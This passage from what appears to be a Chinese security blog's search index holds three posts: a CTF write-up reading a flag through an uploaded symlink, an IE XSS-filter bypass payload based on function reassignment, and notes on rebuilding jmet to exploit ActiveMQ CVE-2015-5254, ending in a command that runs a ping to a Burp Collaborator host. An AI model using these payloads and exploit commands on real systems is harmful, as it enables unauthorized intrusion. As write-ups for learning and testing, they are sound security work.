在web目录下 12345mkdir -p flag/flag/flag/flag/flag/flag/mkdir -p includes/uploadedecho &quot;flag&quot; &gt;&gt; flag/flag/flag/flag/flag/flag/flag.phpcd includes/uploadedln -s ../../flag/flag/flag/flag/flag/flag/flag.php aaaaabbbbbcccccddddd 然后压缩软连接，上传如图 从图中我们也能清楚看到软连接是相对路径 最后访问http://47.104.188.226:20001/includes/uploaded/aaaaabbbbbcccccddddd 即可看到flag 也许你注意把软连接弄到20个字符，是因为在做的时候我犯了个错误，我以为把软连接传上去apache也会跟着软连接的指向去解析php，然后结合一下代码才能利用。 去读文件但其实不是这样的，直接访问软连接就可以看到内容。结合这几天的apache的一些知识，我想给出自己的答案。 apache解析php的原理 首先一个常识是Apache自身并不能解析php。Apache是一个模块化程序，这这就意味着服务器只包括最基本的功能，其他的拓展的功能可以加载模块实现。Apache对于php的解析，就是通过众多Module中的php Module来完成的。 这个php模块会随着apache的启动被load进来。可以通过apachectl -M来查看 那么apache是怎么判断这个文件是不是应该交给php模块处理的呢？答案是通过MIME类型。 linux上有个/etc/mime.types它是mime-support包的一部分，这里面记录了所有的MIME类型。 当客户端请求一个文件时,如果后缀在这个列表里,那么apache就返回对应的content-type给浏览器，如果不在里面apache这个表里面则直接返回文件的内容（不返回content-type）。 当然这个你面有关php的是被注释掉了。不过在/etc/apache2/mods-enabled/php7.0.conf有中有这样一条等价配置。 它表示一旦匹配到php|php3|php4|php5|php7|pht|phtm这种东西则强制执行application/x-httpd-php这种类型所对应的处理器（php7_moudle）。 回头看刚才上传软连接没有后缀，所以apache不可能认识，于是他读出原本的内容（flag.php）然后直接返回并不带任何content-type，有图为证。 最后 最后自己的思考并不保证正确，如果出错还请指正。 参考 https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more https://paper.seebug.org/104/ http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/","link":"/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/"},{"title":"通过函数重定义绕过xss过滤器(IE)","text":"这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。 现在我们需要建立一个实验页面，让用户可控参数出现到JS函数的参数里面。 test.php 123456789&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;&lt;script&gt;function x() {}&lt;?php$x = isset($_GET['x']) ? $_GET['x'] : '';?&gt;x('&lt;?php echo $x?&gt;');&lt;/script&gt; 在老版本的IE浏览器里面，是有可能在一个函数的调用参数的地方重定义这个函数的。这将对绕过xss过滤器非常有用（如果你的payload能出现在这里） 通过GET传参somepage.php?x=1',x=alert,' 最后的结果像是这样 123456&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;&lt;script&gt;function x() {}x('1',x=alert,'');&lt;/script&gt; 这个payload将闭合两边的引号，同时function x重定义为alert因为alert只接受一个参数，所以其他的多余参数将被忽略。 不背翻译的锅 http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/","link":"/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8(IE)/"},{"title":"重新编译jmet小记","text":"在一次渗透测试过程中，发现内网有一些activemq版本很老（2010年前的），但是并没有/fileserver这个路径意味着没法用**CVE-2016-3088（猜测经过加固），**不过幸运的是/admin没有授权就能访问意味着有主动触发CVE-2015-5254的可能性，猜测这种偏门的java洞可能被加固人员忽略，所以抄起jmet试了一下。回显如下 看样子是失败了，经过一番谷歌过后看到github上有如下回答，猜测是因为activemq所依赖的包版本过老而jmet依赖的包比较新所以打不成功。 正如github上这个老外所说需要加入legacy。 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt; &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt; &lt;version&gt;5.15.11&lt;/version&gt;&lt;/dependency&gt; 既然问题问题出在依赖上就意味着要重新编译，踩了一些坑下面记录一下。 jmet可以攻击多种软件，有一些是商业的软件我们搞不到对应的jar，所以删除下面两个java。 12rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.javarm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java 另外注意到jmet是依赖于ysoserial 并且我们后续也会用到，奈何没找到什么中央仓库提供这种黑客依赖。无奈需要自己到导入 1mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.5-SNAPSHOT -Dpackaging=jar -Dfile= 编译 12export MAVEN_OPTS=-Xss10mmvn clean compile assembly:single 然后就可以快乐的一键getshell了。 1proxychains java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net&quot; -Yp ROME ip port","link":"/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"paper reading","slug":"paper-reading","link":"/tags/paper-reading/"},{"name":"redteam","slug":"redteam","link":"/tags/redteam/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"cobaltstrike","slug":"cobaltstrike","link":"/tags/cobaltstrike/"},{"name":"ssrf","slug":"ssrf","link":"/tags/ssrf/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"economics","slug":"economics","link":"/tags/economics/"},{"name":"k8s","slug":"k8s","link":"/tags/k8s/"},{"name":"ML","slug":"ML","link":"/tags/ML/"},{"name":"binary","slug":"binary","link":"/tags/binary/"},{"name":"Information theory","slug":"Information-theory","link":"/tags/Information-theory/"},{"name":"Math","slug":"Math","link":"/tags/Math/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"web cache","slug":"web-cache","link":"/tags/web-cache/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"stock","slug":"stock","link":"/tags/stock/"},{"name":"ebpf","slug":"ebpf","link":"/tags/ebpf/"},{"name":"talking big","slug":"talking-big","link":"/tags/talking-big/"},{"name":"golang","slug":"golang","link":"/tags/golang/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"杂","slug":"杂","link":"/tags/%E6%9D%82/"},{"name":"kerberos","slug":"kerberos","link":"/tags/kerberos/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"xss","slug":"xss","link":"/tags/xss/"}],"categories":[{"name":"redteam","slug":"redteam","link":"/categories/redteam/"},{"name":"web security","slug":"web-security","link":"/categories/web-security/"},{"name":"binary","slug":"binary","link":"/categories/binary/"},{"name":"windows security","slug":"windows-security","link":"/categories/windows-security/"},{"name":"ad security","slug":"ad-security","link":"/categories/ad-security/"}],"pages":[{"title":"","text":"google-site-verification: google852a523ce6b22c69.html","link":"/google852a523ce6b22c69.html"},{"title":"about","text":"cl0und/李三 Syclover核心成员 前奇安信高级攻防部（红队实习） 前拼多多安全工程师 HKUST短暂的RA Shopee安全工程师 / currently pursuing a master degree in computer science at NUS Some high-quality CVEs I got. CVE-2020-14756 CVE-2021-2135 CVE-2021-2136 CVE-2022-21420","link":"/about/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}]}